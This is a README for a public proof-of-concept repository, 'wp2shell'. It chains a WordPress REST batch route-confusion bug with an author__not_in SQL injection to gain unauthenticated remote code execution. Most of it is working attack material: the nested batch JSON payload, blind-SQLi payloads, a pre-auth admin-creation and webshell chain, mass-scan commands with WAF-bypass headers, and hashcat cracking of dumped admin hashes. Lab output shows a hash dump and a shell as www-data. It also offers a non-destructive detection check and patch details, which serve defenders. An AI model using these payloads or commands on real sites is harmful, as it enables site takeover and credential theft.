# CVE-2026-63030 + CVE-2026-60137 - “wp2shell”: unauthenticated RCE in WordPress core

> REST API **batch route confusion** (CVE-2026-63030) chained with a **`WP_Query`
> `author__not_in` SQL injection** (CVE-2026-60137) → **pre-auth remote code
> execution** against a default WordPress install.
>
> Discovered by **Adam Kues** (Assetnote / Searchlight Cyber), disclosed
> 2026-07-17. Advisories: [GHSA-ff9f-jf42-662q](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q),
> [GHSA-fpp7-x2x2-2mjf](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf).

| | |
|---|---|
| **Chain (unauth RCE)** | WordPress **6.9.0 - 6.9.4** and **7.0.0 - 7.0.1** |
| **SQLi only** (needs a facilitating plugin/theme) | 6.8.0 - 6.8.5 |
| **Not affected** | ≤ 6.8 for the *batch confusion*; 6.9.5 / 7.0.2 / 7.1-beta2 (patched) |
| **Preconditions** | REST API reachable; **no persistent object cache** (Redis/Memcached); ≥1 published post |
| **Auth required** | none |
| **Impact** | unauthenticated → create a new administrator → code execution (the SQLi also dumps the admin hash) |

## Demo

https://github.com/user-attachments/assets/7f9cc52c-3f31-4339-9192-e31e506684f6

## What this repo adds

- One original, stdlib-only tool ([wp2shell.py](wp2shell.py)) that unifies the best of six public PoCs into a single file, with no `requests` dependency and no broken features.
- The full **crack-free RCE**, verified end-to-end in-lab: `shell` with no credentials forges a fake `WP_Post` via the single-post UNION confusion, bridges the customizer to create a fresh administrator (`POST /wp/v2/users`), logs in, and drops a token-gated webshell. The SQLi admin-hash dump (`read --preset users`) is kept as a second, verified path.
- A version-independent confusion detector (`block_cannot_read`) used as the primary, non-destructive `check`.
- Production transport on every command: self-signed TLS, custom headers, custom User-Agent, proxy, retries, request delay.
- A verified 6.8.x facilitated-SQLi path (`sqli`) that the other PoCs do not have.
- Reproducible Docker labs plus a version-by-DB reliability matrix, with every result verified in-lab.
- The hashcat mode for the new `$wp$2y$` password hash (`-m 35500`).

```
wp2shell/
├── README.md              ← you are here
├── wp2shell.py            ← the unified PoC (single file, stdlib only, by 0xsha)
└── lab/                   ← reproducible Docker labs + reliability matrix
    ├── docker-compose.yml         (default 6.9.4 lab)
    ├── docker-compose.matrix.yml  (parameterised: any version × MySQL/MariaDB)
    ├── docker-compose.sqli.yml    (6.8.3 "SQLi only" lab)
    ├── matrix.sh                  (runs the whole reliability matrix)
    └── sqli-only/facilitator.php  (mu-plugin: the 6.8.x facilitating sink)
```

The six public PoCs this tool draws from are not vendored here; they are linked in [Credits](#5-credits).

Everything below was **verified in the local Docker lab** (see [§4](#4-version--db-matrix-what-we-actually-tested)); claims that were *not* run in-lab are labelled as such.

---

## 1. Vulnerability details - code deep dive

The chain welds two independent bugs. Line numbers are from the **real WordPress
6.9.4 source** (extracted from `wordpress:6.9.4-apache`).

### Bug A - `author__not_in` SQL injection (CVE-2026-60137)

`wp-includes/class-wp-query.php`, `WP_Query::get_posts()`:

```php
2403  if ( ! empty( $query_vars['author__not_in'] ) ) {
2404      if ( is_array( $query_vars['author__not_in'] ) ) {                 // ← guard only fires for ARRAYS
2405          $query_vars['author__not_in'] = array_unique( array_map( 'absint', $query_vars['author__not_in'] ) );
2406          sort( $query_vars['author__not_in'] );
2407      }
2408      $author__not_in = implode( ',', (array) $query_vars['author__not_in'] );   // ← string passes straight through
2409      $where         .= " AND {$wpdb->posts}.post_author NOT IN ($author__not_in) ";  // ← raw interpolation
2410  } elseif ( ! empty( $query_vars['author__in'] ) ) {
...
2415      $author__in = implode( ',', array_map( 'absint', array_unique( (array) $query_vars['author__in'] ) ) );  // ← absint INSIDE implode
```

A **string** `author__not_in` skips the `is_array()` guard (2404); `implode(',',
(array)"…")` returns it unchanged (2408) and it is concatenated raw into the SQL
(2409). The sibling `author__in` (2415) re-applies `array_map('absint', …)`
*inside* the implode and is safe - that one missing `array_map` is the bug. The
value lands as `... post_author NOT IN (<value>) ...`, so `0) <sql>-- -` closes
the list and appends SQL.

Getting a *string* there is the hard part: the REST posts endpoint maps
`author_exclude → author__not_in` (`class-wp-rest-posts-controller.php:247`) but
declares it `'type' => 'array'` of integers, so core coerces/rejects a string:

```
GET /wp-json/wp/v2/posts?author_exclude=1) OR SLEEP(3)-- -
→ 400 "author_exclude[0] is not of type integer."      (verified on 6.8.3)
```

That is why Bug A alone is only *“facilitated”*. Bug B smuggles the string past
validation on 6.9+.

### Bug B - REST batch route confusion (CVE-2026-63030)

`wp-includes/rest-api/class-wp-rest-server.php`, `serve_batch_request_v1()`:

```php
1720  if ( false === $parsed_url ) {
1721      $requests[] = new WP_Error( 'parse_path_failed', … );   // a bad path becomes a WP_Error IN $requests

1749  foreach ( $requests as $single_request ) {
1750      if ( is_wp_error( $single_request ) ) {
1752          $validation[] = $single_request;     // ← pushed to $validation …
1753          continue;                            // ← … but $matches is SKIPPED
1754      }
1757      $matches[] = $match;                     // ← $matches only grows for VALID requests

1825  foreach ( $requests as $i => $single_request ) {   // indexed by position in $requests
1841      $match = $matches[ $i ];                        // ← $matches is SHORTER → +1 shift
1861      $result = $this->respond_to_request( $single_request, $route, $handler, $error );
```

A `WP_Error` sub-request is pushed to `$validation[]` (1752) but **not** to
`$matches[]` (the `continue` at 1753 skips 1757), so `$matches` runs short and
`$matches[$i]` (1841) holds the **next** request’s handler. Request *i* is
dispatched with request *i+1*’s handler, carrying its own params and its own
(passed) validation verdict.

**Regression origin (verified 6.8.3 → 6.9.4 diff):** in 6.8.3 the loop pushes
`$matches[] = $match` for *every* request and bad paths are dropped in the first
loop - arrays stay aligned, **no desync**. 6.9.0’s refactor introduced the shift.
That is exactly why 6.8.x is “SQLi only” and the RCE chain begins at 6.9.0.

### The documented fix (6.9.5 / 7.0.2)

The patch appends `$matches[]` for error entries too, hardens re-entrancy, and
parses `author__not_in` with an id-list helper. *(6.9.5 was not on Docker Hub at
test time, so this is from the advisories, not an in-lab diff.)*

---

## 2. Exploitation method

### 2.1 The double route confusion

The batch schema only allows `POST/PUT/PATCH/DELETE` sub-requests, but posts
`get_items` (the `author_exclude` sink) is **GET-only**, so the confusion is
nested **twice**:

```jsonc
// OUTER batch → POST /wp-json/batch/v1
{"requests": [
  {"method":"POST","path":"///"},                       // [0] bad path → WP_Error → +1 shift
  {"method":"POST","path":"/wp/v2/posts",               // [1] carrier: validated as a posts CREATE →
     "body": { /* INNER batch */ }},                     //     its `requests` body is never schema-checked
  {"method":"POST","path":"/batch/v1",                  // [2] handler → [1] dispatched as serve_batch_request_v1
     "body":{"requests":[]}}                             //     (no permission_callback → unauthenticated)
]}
// INNER batch (GET now allowed):
//   [0] POST ///                                        WP_Error → inner +1 shift
//   [1] GET /wp/v2/users?author_exclude=<PAYLOAD>       users has no author_exclude → PAYLOAD passes untouched
//   [2] GET /wp/v2/posts                                [2]'s handler = posts get_items → runs [1] → SQLi
```

`///` is the desync primer (any `wp_parse_url()`-rejecting path works). The tool
also ships a `--variant categories` version of the same trick.

### 2.2 Detecting the confusion *without* the SQLi

A single, non-destructive, **version-independent** probe confirms
CVE-2026-63030 even when the SQLi sink is object-cached or WAF-filtered: a batch
of `POST` sub-requests where the desync makes `POST /wp/v2/posts` be answered by
the **block-renderer’s** permission callback:

```
responses[1].code == "block_cannot_read"    ← a permission error from a handler it never asked for
```

`wp2shell.py check` uses this as its primary signal (structural post-vs-term
shape as fallback). *(Detection technique: Hadrian / Icex0.)*

### 2.3 From injection to data (blind)

The value sits inside `NOT IN (<value>)`, a clean boolean oracle: `0) AND
(<cond>)-- -` returns rows iff `<cond>` holds. Extraction is character-by-character
binary search over `ASCII(SUBSTRING(COALESCE((expr),''),n,1))` (the `COALESCE`
keeps a NULL from short-circuiting into an empty read).

> **Lab note - time-based needs care.** Naïve `0) OR SLEEP(n)-- -` gives *no
> delay* on a default install: published rows satisfy the query first and
> short-circuit the `OR`. Confirmation is a deterministic **boolean
> differential**; timing uses `0) AND (SELECT 1 FROM (SELECT SLEEP(n))_z)-- -`.
> Observed 0.01s vs 3.04s.

### 2.4 From injection to shell (RCE) - crack-free

The practical RCE needs **no password and no cracking**. `shell` with no
credentials runs the full chain, all verified in-lab:

1. **Fake `WP_Post` primitive.** A second confusion variant reaches a clean,
   `UNION`-able query: `/wp/v2/posts/999999?orderby=none&per_page=500` is
   validated against the single-post item schema (so the collection-only params
   pass unchecked), then desynced onto the posts collection handler. `orderby=none`
   removes the trailing `ORDER BY` and `per_page=500` keeps `WP_Query` in full-row
   mode, so a `UNION SELECT` survives as a fabricated `wp_posts` row.
2. **SQLi-to-customizer bridge.** Forge `oembed_cache` + `customize_changeset`
   (its `user_id` set to an existing admin's ID, read via the UNION) +
   `nav_menu_item` rows. Triggering the oEmbed makes the customizer changeset run
   **as that admin**.
3. **Create a fresh admin.** In the same batch, `POST /wp/v2/users` with
   `roles:["administrator"]` now succeeds under the borrowed admin context, and a
   new `wp2_*` administrator appears in `wp_users` (verified: a new admin row).
4. **Log in + webshell.** Authenticate with the generated credentials, upload a
   **token-gated** plugin via `update.php?action=upload-plugin`, run commands.
   Verified: `uid=33(www-data)`.

**Older alternate (`--user`/`--password`).** `read --preset users` dumps
`wp_users.user_pass` (WordPress 6.9's `$wp$2y$…` = bcrypt over HMAC-SHA384; crack
with **`hashcat -m 35500`**), then `shell --user/--password` logs in with the
recovered plaintext. Real, but bcrypt makes it slow, so the create-admin chain
above is the canonical path.

### 2.5 The 6.8.x “SQLi only” path

6.8.x has Bug A but not Bug B, and core coerces `author_exclude` to an int array,
so the SQLi is reachable only through a **facilitating** plugin/theme that hands
`WP_Query` a raw string. The `sqli` subcommand injects into such a sink directly
(time-based by default; fast boolean with `--true-contains`). Demonstrated
against the `lab/sqli-only` facilitator on 6.8.3.

---

## 3. Usage

### 3.1 The unified PoC - `wp2shell.py`

Single file, Python 3.7+, **standard library only**. Prod-ready transport on
every command: `--insecure` (self-signed TLS), `-H 'K: V'` (repeatable),
`--user-agent`, `--proxy`, `--retries`, `--delay`.

```text
check   fingerprint + confusion marker + confirm the SQLi (non-destructive)
read    read the DB via blind SQLi     (--preset fingerprint|users | --query "SELECT …")
shell   RCE: admin login → token-gated plugin webshell → run commands (-i for a REPL)
sqli    author__not_in SQLi against a direct/facilitated sink (6.8.x, or any plugin sink)
scan    threaded vuln-check over a single URL OR a .txt list   (--prove, --json)
```

```bash
./wp2shell.py check https://target
./wp2shell.py read  https://target --preset users            # logins + $wp$2y$ hashes (+ hashcat hint)
./wp2shell.py read  https://target --query "SELECT @@version"
./wp2shell.py shell https://target --cmd id                  # crack-free: creates an admin, then webshell
./wp2shell.py shell https://target -i                        # interactive shell
./wp2shell.py shell https://target --user admin --password '<cracked>' --cmd id   # or reuse an existing admin
./wp2shell.py scan  https://target --prove                   # single URL, extract @@version as proof
./wp2shell.py scan  targets.txt --threads 10 --json out.json # a .txt of targets
./wp2shell.py sqli  https://target --endpoint '/?plugin_route=1' --param author_not_in --true-contains ROWS:YES

# prod knobs: self-signed TLS, WAF header, Burp, rate-limit
./wp2shell.py check https://target --insecure -H 'X-Forwarded-For: 127.0.0.1' --proxy http://127.0.0.1:8080 --delay 0.2
```

### 3.2 The lab

```bash
# default vulnerable lab (WordPress 6.9.4 + MariaDB), http://localhost:8080
docker compose -f lab/docker-compose.yml up -d
docker compose -f lab/docker-compose.yml logs -f wpcli      # wait for "LAB READY"
./wp2shell.py check http://localhost:8080
docker compose -f lab/docker-compose.yml down -v

bash lab/matrix.sh                                           # full version × DB matrix

# "SQLi only" lab (6.8.3 + facilitating mu-plugin), http://localhost:8082
docker compose -f lab/docker-compose.sqli.yml up -d
./wp2shell.py sqli http://localhost:8082 --endpoint '/?wp2shell_faccheck=1' \
     --param author_not_in --true-contains ROWS:YES --preset fingerprint
```

Lab admin is `admin` / `Admin!2345` - plaintext known only so the lab can demo
the post-auth `shell`; a real attacker recovers the *hash* and cracks it.

---

## 4. Version & DB matrix - what we actually tested

DB scope is limited to **MySQL and MariaDB** - WordPress core speaks no other
engine in production (no PostgreSQL/MSSQL driver; SQLite only via a rare plugin).

| WordPress | DB engine | Path | `check` | Data extracted |
|---|---|---|---|---|
| **6.9.4** | MariaDB 11 | batch chain | ✅ full RCE | admin `$wp$2y$…` hash + `@@version` |
| **7.0.1** | MariaDB 11 | batch chain | ✅ full RCE | admin hash |
| **6.9.4** | **MySQL 8.4** | batch chain | ✅ full RCE | admin hash (payloads portable) |
| **6.8.3** | MariaDB 11 | batch chain | ⛔ 207 but **no confusion** | - (matches advisory) |
| **6.8.3** | MariaDB 11 | facilitated `sqli` | ✅ CVE-2026-60137 | `@@version`, user, db - boolean **and** time-based |

**Every command exercised in-lab:** `check` (marker `block_cannot_read` +
boolean + time), `read` (fingerprint / users / `--query`), `shell` (crack-free
create-admin → login → webshell → `uid=33(www-data)`, plus `--user/--password`
and interactive REPL), `sqli` (boolean + time), `scan` (single
URL + `.txt` + `--json` + `--prove`), the `--variant categories` payload,
endpoint auto-detect (`/wp-json/` + `?rest_route=`), and the transport flags.

```
$ ./wp2shell.py check http://localhost:8080
[+] Batch endpoint reachable and unauthenticated (HTTP 207) at http://localhost:8080/wp-json/batch/v1
[+] Route confusion ACTIVE - categories request answered by the block-renderer handler (block_cannot_read); CVE-2026-63030 confirmed.
[+] SQL injection CONFIRMED - boolean-blind differential over author__not_in (CVE-2026-60137).
[+] Time-based channel also confirmed - baseline 0.02s vs injected 3.04s.

$ ./wp2shell.py read http://localhost:8080 --preset users
[+] 1|admin|$wp$2y$10$IUUVXuWQ45USOc/rkRAcduAEvyYmHNabvfWFBMq5ApR9RGau6Fxx.
[*] crack the $wp$2y$ hashes with:  hashcat -m 35500 …

$ ./wp2shell.py shell http://localhost:8080 --cmd id
[*] No credentials supplied - creating a fresh administrator pre-auth (no hash, no crack) ...
[+] Administrator created: wp2_950eeb3deda8 / Wp2!...  (borrowed admin id 1)
[+] Authenticated.
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 5. Credits

- **Vulnerability research & disclosure:** **Adam Kues - Assetnote / Searchlight
  Cyber** (“wp2shell”), 2026-07-17.
- **Advisories:** [GHSA-ff9f-jf42-662q](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q),
  [GHSA-fpp7-x2x2-2mjf](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf).
  Write-ups: [Rapid7](https://www.rapid7.com/blog/post/etr-cve-2026-63030-wp2shell-a-critical-remote-code-execution-vulnerability-in-wordpress-core/),
  [Beazley Labs](https://labs.beazley.security/advisories/BSL-A1193),
  [Hadrian](https://hadrian.io/blog/wp2shell-a-pre-authentication-rce-in-wordpress-cores-rest-batch-api) (the `block_cannot_read` detection idea),
  [VulnCheck](https://www.vulncheck.com/blog/wp2shell).
- **Technique credit** (each re-implemented from scratch in `wp2shell.py`, no code copied verbatim):
  - [attackercan/wp2shell-poc2](https://github.com/attackercan/wp2shell-poc2) - verified nested double-confusion core, blind extractor, token-gated webshell + REPL.
  - [sergiointel/wp2shell-poc](https://github.com/sergiointel/wp2shell-poc) - **the crack-free pre-auth admin-creation technique**: forge a fake `WP_Post` via the single-post route confusion, drive an `oembed_cache` + `customize_changeset` (`user_id`=admin) + `nav_menu_item` graph so the customizer runs as an existing admin, then `POST /wp/v2/users` to mint a new administrator.
  - [Icex0/wp2shell-poc](https://github.com/Icex0/wp2shell-poc) - the implementation of that chain I adapted (`union_inject` single-post confusion, `UnionSQLi`, `PreAuthAdminCreator`), the `block_cannot_read` marker detector, NULL-safe `COALESCE` extraction, and jitter-resistant timing.
  - [Senanfurkan/wordpress-cve-2026-63030](https://github.com/Senanfurkan/wordpress-cve-2026-63030) - version fingerprint/classification and the structural route-confusion test.
  - [Lutfifakee-Project/wp2shell](https://github.com/Lutfifakee-Project/wp2shell) - mass scanning.
  - [NULL200OK/WP2Shell](https://github.com/NULL200OK/WP2Shell) - JSON reporting.
  - [ekomsSavior/wp2shell](https://github.com/ekomsSavior/wp2shell) - interactive-UX inspiration.
- **Hash-cracking mode** (`$wp$2y$` → `hashcat -m 35500`): hashpwn / hashcat.

---

## Legal / authorized use

For **authorized security testing and education only** - systems you own or may
test in writing. All exploitation here ran against a local, disposable Docker
lab; the webshell is token-gated and the default command is benign. You are
responsible for how you use this.
